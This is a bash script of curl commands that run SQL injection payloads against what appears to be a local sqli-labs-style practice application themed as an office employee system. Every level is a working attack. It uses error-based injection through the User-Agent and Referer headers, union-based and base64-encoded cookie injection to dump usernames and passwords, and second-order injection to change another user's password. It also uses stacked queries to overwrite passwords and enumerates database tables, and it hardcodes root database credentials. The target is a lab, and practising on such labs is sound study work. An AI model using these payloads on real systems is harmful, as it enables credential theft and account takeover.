#!/bin/bash
B="http://127.0.0.1/_oatest/app/challenge.php"
PHP=/d/phpstudy_pro/Extensions/php/php7.2.9nts/php.exe

echo "### L18 UA 报错注入"
curl -s -X POST "$B?c=Less-18" \
  -A "1' and extractvalue(1,concat(0x7e,(select password from oa_employee where username='admin'),0x7e)) and '1'='1" \
  --data-urlencode "uname=admin" --data-urlencode "passwd=Xc@Admin2024" \
  | grep -oE 'sys-note">[^<]*|sys-info">[^<]*' | head -3

echo "### L19 Referer 报错注入"
curl -s -X POST "$B?c=Less-19" -e "http://x/1' and updatexml(1,concat(0x7e,(select password from oa_employee where username='admin'),0x7e),1) and '1'='1" \
  --data-urlencode "uname=admin" --data-urlencode "passwd=Xc@Admin2024" \
  | grep -oE 'sys-note">[^<]*|sys-info">[^<]*' | head -3

echo "### L20 Cookie 注入"
curl -s -G "$B" --data-urlencode "c=Less-20" \
  -H "Cookie: uname=-1'/**/union/**/select/**/1,group_concat(username,0x3a,password),3/**/from/**/oa_employee%23" \
  | grep -oE 'result-value">[^<]*|sys-note">[^<]*|sys-info">[^<]*' | head -3

P21=$($PHP -r 'echo base64_encode("-1\x27) union select 1,group_concat(username,0x3a,password),3 from oa_employee#");')
echo "### L21 base64 Cookie ($P21)"
curl -s -G "$B" --data-urlencode "c=Less-21" -H "Cookie: uname=$P21" \
  | grep -oE 'result-value">[^<]*|sys-note">[^<]*' | head -3

P22=$($PHP -r 'echo base64_encode("-1\" union select 1,group_concat(username,0x3a,password),3 from oa_employee#");')
echo "### L22 base64 Cookie 双引号"
curl -s -G "$B" --data-urlencode "c=Less-22" -H "Cookie: uname=$P22" \
  | grep -oE 'result-value">[^<]*|sys-note">[^<]*' | head -3

echo "### L24 二次注入（注册→登录→改密）"
J=$(mktemp)
curl -s -c "$J" -b "$J" -X POST "$B?c=Less-24" \
  --data-urlencode "action=register" --data-urlencode "emp_no=XC9999" --data-urlencode "name=测试" \
  --data-urlencode "username=lina'#" --data-urlencode "password=abc123" --data-urlencode "re_password=abc123" \
  | grep -oE 'sys-info">[^<]*' | head -1
curl -s -c "$J" -b "$J" -X POST "$B?c=Less-24" \
  --data-urlencode "action=login" --data-urlencode "login_user=lina'#" --data-urlencode "login_password=abc123" \
  | grep -oE 'sys-info">[^<]*' | head -1
curl -s -c "$J" -b "$J" -X POST "$B?c=Less-24" \
  --data-urlencode "action=chpass" --data-urlencode "current_password=whatever" \
  --data-urlencode "password=Hacked@123" --data-urlencode "re_password=Hacked@123" \
  | grep -oE 'sys-info">[^<]*|sys-note">[^<]*' | head -2
$PHP -r '$c=new mysqli("localhost","root","root","security");$r=$c->query("select password from oa_employee where username=\"lina\"");echo "lina 现在的密码 => ",$r->fetch_assoc()["password"],"\n";'
rm -f "$J"

echo "### L42 密码栏堆叠"
curl -s -X POST "$B?c=Less-42" --data-urlencode "login_user=admin" \
  --data-urlencode "login_password=1';update oa_employee set password='pwned42' where username='hejun'-- -" \
  | grep -oE 'sys-note">[^<]*|sys-info">[^<]*' | head -2
$PHP -r '$c=new mysqli("localhost","root","root","security");$r=$c->query("select password from oa_employee where username=\"hejun\"");echo "hejun => ",$r->fetch_assoc()["password"],"\n";'

echo "### L54 挑战关取表名"
curl -s -G "$B" --data-urlencode "c=Less-54" --data-urlencode "id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'-- -" \
  | grep -oE 'result-value">[^<]*' | head -3
